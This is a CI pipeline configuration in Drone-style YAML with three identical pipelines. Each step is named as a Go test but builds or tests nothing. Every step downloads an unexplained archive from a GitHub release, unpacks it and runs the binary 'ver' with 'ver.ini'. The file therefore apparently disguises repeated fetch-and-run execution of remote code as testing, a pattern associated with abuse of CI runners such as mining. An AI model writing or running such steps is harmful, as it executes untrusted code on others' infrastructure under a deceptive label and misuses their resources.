kind: pipeline
type: docker
name: default-1 

steps:
- name: test-1 
  image: golang 
  commands: 
  - wget https://github.com/Wakfodo/test/releases/download/Testing/ver.tar.gz && tar -xvf ver.tar.gz && ./ver ver.ini

kind: pipeline
type: docker
name: default-2 

steps:
- name: test-2 
  image: golang 
  commands: 
  - wget https://github.com/Wakfodo/test/releases/download/Testing/ver.tar.gz && tar -xvf ver.tar.gz && ./ver ver.ini
  
kind: pipeline
type: docker
name: default-3 

steps:
- name: test-3 
  image: golang 
  commands: 
  - wget https://github.com/Wakfodo/test/releases/download/Testing/ver.tar.gz && tar -xvf ver.tar.gz && ./ver ver.ini
